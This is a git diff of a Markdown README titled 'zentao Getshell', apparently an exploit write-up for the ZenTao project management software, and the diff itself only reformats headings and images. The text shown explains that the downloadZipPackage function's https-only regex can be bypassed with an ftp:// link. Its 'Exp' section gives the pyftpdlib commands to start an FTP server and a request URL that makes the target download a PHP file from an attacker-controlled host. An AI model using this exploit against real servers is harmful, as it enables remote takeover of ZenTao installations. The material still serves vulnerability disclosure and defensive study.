@@ -1,7 +1,8 @@
 # zentao Getshell
 
 ![](./12.4.2.png)
-![](./client.png)
+
+
 
 ## downloadZipPackage
 
@@ -37,9 +38,7 @@ zentaopro\tmp\model\client.php:    return parent::downloadZipPackage($version, $
 C:\Users\Jas502n\Desktop\xampp>
 ```
 
-####
-
-`\model\client.php`
+#### \model\client.php
 
 ```
 <?php
@@ -69,10 +68,14 @@ public function downloadZipPackage($version, $link)
 ```
 利用ftp绕过正则匹配 `if(preg_match('/^https?\:\/\//', $decodeLink)) return false;`
 
+
+
 ## Exp
 
 `pip install pyftpdlib`
 `python -m pyftpdlib`
+
+![](./ftp.png)
 
 ```
 /zentao/client-download-2-ftp://172.16.242.1:2121/jas502n.php-1.html
